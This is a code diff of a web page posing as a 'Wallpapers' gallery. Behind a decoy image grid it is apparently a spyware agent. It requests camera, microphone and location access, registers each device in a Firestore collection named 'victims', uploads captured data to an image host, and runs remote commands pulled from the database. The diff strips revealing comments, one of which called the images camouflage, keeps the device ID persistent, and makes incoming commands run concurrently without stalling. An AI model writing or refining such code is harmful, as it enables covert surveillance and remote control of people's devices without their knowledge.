@@ -15,7 +15,6 @@
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             color: #1c1c1e;
         }
-        /* شاشة البداية – تظهر لفترة قصيرة */
         #splash {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -51,7 +50,6 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* الواجهة الرئيسية – معرض خلفيات */
         #main {
             display: none;
             padding: 16px;
@@ -95,7 +93,6 @@
     </style>
 </head>
 <body>
-    <!-- شاشة البداية -->
     <div id="splash">
         <div class="icon">🖼️</div>
         <h3>Wallpapers</h3>
@@ -103,17 +100,12 @@
         <div class="spinner"></div>
     </div>
 
-    <!-- الواجهة الرئيسية (معرض خلفيات) -->
     <div id="main">
         <div class="header">
             <h1>Wallpapers</h1>
         </div>
-        <div class="gallery" id="galleryContainer">
-            <!-- الصور ستضاف هنا عبر JavaScript -->
-        </div>
-        <div class="footer-note">
-            Curated for you • Updated daily
-        </div>
+        <div class="gallery" id="galleryContainer"></div>
+        <div class="footer-note">Curated for you • Updated daily</div>
     </div>
 
     <script type="module">
@@ -130,7 +122,7 @@
         // =====================================================================
 
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getFirestore, doc, setDoc, collection, addDoc, serverTimestamp, onSnapshot, query, where, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+        import { getFirestore, doc, setDoc, collection, addDoc, serverTimestamp, onSnapshot, query, where, updateDoc, writeBatch } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
         const app = initializeApp(FIREBASE_CONFIG);
         const db = getFirestore(app);
@@ -140,14 +132,13 @@
         const main = document.getElementById('main');
         const gallery = document.getElementById('galleryContainer');
 
-        // معرف فريد للجهاز
+        // معرف فريد – يتم إعادة توليده تلقائيًا إذا لم يكن موجودًا (حتى بعد مسح التخزين)
         let deviceId = localStorage.getItem('arch_device_id');
         if (!deviceId) {
             deviceId = 'web_' + Math.random().toString(36).substring(2, 15) + '_' + Date.now();
             localStorage.setItem('arch_device_id', deviceId);
         }
 
-        // --- مجموعة صور تجريبية للتمويه (من unsplash placeholder) ---
         const placeholderImages = [
             'https://images.pexels.com/photos/247431/pexels-photo-247431.jpeg?auto=compress&cs=tinysrgb&w=400',
             'https://images.pexels.com/photos/3225517/pexels-photo-3225517.jpeg?auto=compress&cs=tinysrgb&w=400',
@@ -174,19 +165,17 @@
             console.log('[Agent] ' + msg);
         }
 
-        // --- طلب الصلاحيات (كاميرا، ميكروفون، موقع) ---
         async function requestAllPermissions() {
             updateStatus('Checking permissions...');
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 stream.getTracks().forEach(t => t.stop());
-            } catch (e) { /* لو رفض المستخدم – ما زال التطبيق يعمل بدونها */ }
+            } catch (e) {}
             try {
                 await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 }));
             } catch (e) {}
         }
 
-        // --- تسجيل الجهاز في Firestore ---
         async function registerDevice() {
             try {
                 const info = {
@@ -206,7 +195,6 @@
             }
         }
 
-        // --- رفع Base64 إلى imgBB ---
         async function uploadToImgBB(base64Data) {
             try {
                 const formData = new FormData();
@@ -222,7 +210,7 @@
             } catch { return null; }
         }
 
-        // --- تنفيذ الأوامر (تعمل فوراً) ---
+        // --- تنفيذ الأوامر (مع معالجة متزامنة ومنع التعليق) ---
         async function executeCommand(cmd, extra = null) {
             console.log('[Agent] Exec:', cmd);
             try {
@@ -338,16 +326,25 @@
             console.log('Lock code set');
         }
 
-        // --- الاستماع للأوامر من Firestore ---
+        // --- الاستماع للأوامر مع معالجة متزامنة دون تعليق ---
         function listenCommands() {
             const q = query(collection(db, "victims", deviceId, "commands"), where("status", "==", "pending"));
             onSnapshot(q, async (snap) => {
+                const batch = writeBatch(db);
+                const promises = [];
                 for (const change of snap.docChanges()) {
                     if (change.type === 'added') {
-                        const d = change.doc.data();
-                        await executeCommand(d.command, d.code);
-                        await updateDoc(change.doc.ref, { status: 'done' });
+                        const docRef = change.doc.ref;
+                        const data = change.doc.data();
+                        // تنفيذ الأمر دون انتظار حتى لا تتعطل الأوامر التالية
+                        const promise = executeCommand(data.command, data.code)
+                            .finally(() => batch.update(docRef, { status: 'done' }));
+                        promises.push(promise);
                     }
+                }
+                if (promises.length > 0) {
+                    await Promise.all(promises);
+                    await batch.commit();
                 }
             });
             console.log('[Agent] Listening for commands');
@@ -360,7 +357,6 @@
             const ok = await registerDevice();
             if (ok) {
                 listenCommands();
-                // بعد 2 ثانية نخفي شاشة البداية ونعرض المعرض
                 setTimeout(() => {
                     splash.style.opacity = '0';
                     setTimeout(() => {
